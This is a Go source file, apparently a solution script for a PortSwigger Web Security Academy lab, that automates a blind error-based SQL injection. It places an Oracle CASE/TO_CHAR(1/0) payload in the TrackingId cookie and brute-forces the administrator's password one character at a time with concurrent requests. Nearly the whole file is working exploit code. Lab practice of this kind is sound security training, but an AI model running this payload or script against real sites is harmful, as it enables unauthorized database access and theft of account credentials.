package main

import (
	"fmt"
	"net/http"
	"strconv"
	"sync"
)

var (
	mainUrl = "https://0a55001c035f65ab83f2790a007c0076.web-security-academy.net"
	// mainUrl       = "http://localhost:3333"
)

func main() {
	maxPasswordLength := 25
	resChan := make(chan string, maxPasswordLength)

	// i MUST be equal to 1 NOT to 0 in the beginning
	// because SUBSTR(password, 0, 1) is the same as SUBSTR(password, 1, 1)
	for i := 1; i < maxPasswordLength; i++ {
		fmt.Println("iteration: " + strconv.Itoa(i))
		var wg sync.WaitGroup

		minAsciiChar := 32
		maxAsciiChar := 127
		for asciiChar := minAsciiChar; asciiChar < maxAsciiChar; asciiChar++ {
			wg.Add(1)
			go flow(&wg, resChan, string(rune(asciiChar)), i)
		}

		wg.Wait()
	}

	resStr := ""
	numOfCharsInChannel := len(resChan)
	if numOfCharsInChannel > 0 {
		for i := 0; i < numOfCharsInChannel; i++ {
			resStr += <-resChan
		}
	}
	fmt.Println("res:")
	fmt.Println(resStr)
}

func flow(wg *sync.WaitGroup, resChan chan string, ch string, charNum int) {
	defer wg.Done()

	cookie := fmt.Sprintf("TrackingId=AjhWwvSt7UT7lBKL' AND (SELECT CASE WHEN ((SELECT SUBSTR(password, %d, 1) FROM users WHERE username = 'administrator')='%s') THEN '1' ELSE TO_CHAR(1/0) END FROM dual)='1' -- ; session=GHnommA3OAx6rW2371W8kLLryLKJjhfw", charNum, ch)

	resp := makeHttpReq(http.MethodGet, mainUrl, "", cookie, true)
	// rawHttpLikeOutput(resp, true)
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		resChan <- ch
		fmt.Println(ch)
	}
}
